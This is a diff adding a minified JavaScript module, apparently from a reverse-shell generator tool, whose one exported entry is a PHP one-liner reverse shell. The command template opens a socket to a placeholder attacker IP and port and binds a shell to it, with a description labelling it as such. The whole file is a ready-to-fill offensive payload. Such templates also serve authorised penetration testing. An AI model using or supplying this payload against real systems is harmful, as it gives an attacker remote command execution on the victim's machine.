@@ -1,0 +1,1 @@
+const e=[{title:"PHP Popen Reverse Shell",template:`php -r '$sock=fsockopen("{ip}",{port});popen("sh <&3 >&3 2>&3", "r");'`,description:"PHP one-liner reverse shell using popen function."}],o={commands:e};export{e as commands,o as default};
